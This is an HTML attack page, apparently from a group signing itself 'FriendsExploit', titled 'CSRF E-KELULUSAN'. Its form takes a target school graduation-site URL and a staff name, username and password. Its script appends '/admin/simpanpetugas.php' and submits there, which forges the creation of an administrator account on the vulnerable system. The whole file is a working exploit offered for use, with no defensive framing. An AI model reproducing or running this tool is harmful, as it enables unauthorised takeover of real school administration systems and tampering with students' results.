<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CSRF E-KELULUSAN</title>
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />
  <style>
    body {
      background-color: #111;
      color: #fff;
      height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column; /* supaya footer di bawah */
    }

    .form-image-wrapper {
      display: flex;
      max-width: 600px; /* agar form tidak terlalu lebar */
      width: 100%;
      height: auto;
    }

    .form-section {
      flex: 1;
      background: rgba(28, 28, 28, 0.95);
      padding: 30px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      border-radius: 0;
      overflow: hidden;
      box-shadow: none;
    }

    .form-title {
      text-align: center;
      margin-bottom: 20px;
      font-weight: bold;
      color: #0d6efd;
    }

    /* Styling footer */
    footer {
      margin-top: 15px;
      text-align: center;
      color: #888;
      font-size: 14px;
      background-color: #111;
      padding: 10px 0;
      width: 100%;
      max-width: 600px;
      user-select: none;
    }
  </style>
</head>
<body>
  <div class="form-image-wrapper">
    <!-- Form saja -->
    <div class="form-section">
      <h3 class="form-title">CSRF E-KELULUSAN</h3>
      <form id="csrfForm" action="" method="POST">
        <div class="mb-3">
          <label for="formAction" class="form-label">
            INPUT URL <span style="color: orange;"></span>
          </label>
          <input
            type="url"
            class="form-control"
            id="formAction"
            name="formAction"
            placeholder="Contoh: https://kelulusan.webtarget.sch.id"
            required
            value=""
          />
        </div>
        <div class="mb-3">
          <label for="nama" class="form-label">NAMA PETUGAS</label>
          <input
            type="text"
            class="form-control"
            id="nama"
            name="nama"
            placeholder="Masukkan Nama Petugas"
            required
          />
        </div>
        <div class="mb-3">
          <label for="username" class="form-label">USERNAME</label>
          <input
            type="text"
            class="form-control"
            id="username"
            name="username"
            placeholder="Masukkan Username"
            required
          />
        </div>
        <div class="mb-3">
          <label for="pass" class="form-label">PASSWORD</label>
          <input
            type="text"
            class="form-control"
            id="pass"
            name="pass"
            placeholder="Masukkan Password"
            required
          />
        </div>
        <div class="d-grid">
          <button type="submit" class="btn btn-primary">Simpan Data</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Footer -->
  <footer>
    &copy; Copyright by FriendsExploit
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    const form = document.getElementById("csrfForm");
    const formActionInput = document.getElementById("formAction");

    form.addEventListener("submit", function (e) {
      let baseUrl = formActionInput.value.trim();

      // Hilangkan trailing slash kalau ada
      if (baseUrl.endsWith("/")) {
        baseUrl = baseUrl.slice(0, -1);
      }

      const suffix = "/admin/simpanpetugas.php";

      // Cek apakah sudah ada suffix
      if (!baseUrl.endsWith(suffix)) {
        baseUrl += suffix;
      }

      // Set action form ke URL lengkap
      form.action = baseUrl;
    });
  </script>
</body>
</html>
